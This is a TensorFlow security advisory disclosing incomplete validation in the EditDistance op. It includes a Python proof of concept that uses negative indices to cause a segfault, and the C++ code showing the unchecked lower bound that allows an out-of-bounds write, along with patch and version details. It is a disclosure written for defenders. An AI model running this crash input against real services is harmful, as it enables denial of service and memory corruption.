summary: "Segfault and OOB write due to incomplete validation in `EditDistance` in TensorFlow\n\
  ### Impact\nThe implementation of [`tf.raw_ops.EditDistance`]() has incomplete validation.\
  \ Users can pass negative values to cause a segmentation fault based denial of service:\n\n\
  ```python\nimport tensorflow as tf\n\nhypothesis_indices = tf.constant(-1250999896764, shape=[3,\
  \ 3], dtype=tf.int64) \nhypothesis_values = tf.constant(0, shape=[3], dtype=tf.int64)\nhypothesis_shape\
  \ = tf.constant(0, shape=[3], dtype=tf.int64)\n\ntruth_indices = tf.constant(-1250999896764,\
  \ shape=[3, 3], dtype=tf.int64)\ntruth_values = tf.constant(2, shape=[3], dtype=tf.int64)\n\
  truth_shape = tf.constant(2, shape=[3], dtype=tf.int64) \n\ntf.raw_ops.EditDistance(\n  hypothesis_indices=hypothesis_indices,\n\
  \  hypothesis_values=hypothesis_values,\n  hypothesis_shape=hypothesis_shape,\n  truth_indices=truth_indices,\n\
  \  truth_values=truth_values,\n  truth_shape=truth_shape)\n```\n\nIn multiple places throughout\
  \ the code, we are computing an index for a write operation:\n\n```cc\nif (g_truth == g_hypothesis)\
  \ {\n  auto loc = std::inner_product(g_truth.begin(), g_truth.end(),\n                   \
  \             output_strides.begin(), int64_t{0});\n  OP_REQUIRES(\n      ctx, loc < output_elements,\n\
  \      errors::Internal(\"Got an inner product \", loc,\n                       \" which would\
  \ require in writing to outside of \"\n                       \"the buffer for the output\
  \ tensor (max elements \",\n                       output_elements, \")\"));\n  output_t(loc)\
  \ =\n      gtl::LevenshteinDistance<T>(truth_seq, hypothesis_seq, cmp);\n  // ...\n}\n```\n\
  \nHowever, the existing validation only checks against the upper bound of the array. Hence,\
  \ it is possible to write before the array by massaging the input to generate negative values\
  \ for `loc`.\n\n### Patches\nWe have patched the issue in GitHub commit [30721cf564cb029d34535446d6a5a6357bebc8e7](https://github.com/tensorflow/tensorflow/commit/30721cf564cb029d34535446d6a5a6357bebc8e7).\n\
  \nThe fix will be included in TensorFlow 2.9.0. We will also cherrypick this commit on TensorFlow\
  \ 2.8.1, TensorFlow 2.7.2, and TensorFlow 2.6.4, as these are also affected and still in supported\
  \ range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md)\
  \ for more information regarding the security model and how to contact us with issues and\
  \ questions.\n\n### Attribution\nThis vulnerability has been reported by Neophytos Christou\
  \ from Secure Systems Lab at Brown University."
